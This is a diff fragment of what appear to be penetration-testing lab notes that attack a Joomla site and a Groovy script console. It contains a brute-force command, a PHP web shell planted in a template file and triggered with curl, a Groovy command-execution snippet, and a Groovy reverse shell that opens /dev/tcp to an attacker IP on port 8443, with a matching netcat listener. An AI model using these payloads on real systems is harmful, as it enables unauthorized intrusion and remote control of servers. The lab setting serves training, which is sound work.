@@ -16,3 +16,19 @@ $ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/m
 system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 
 curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+
+
+def cmd = 'id'
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = cmd.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println sout
+
+
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+$ nc -lvnp 8443
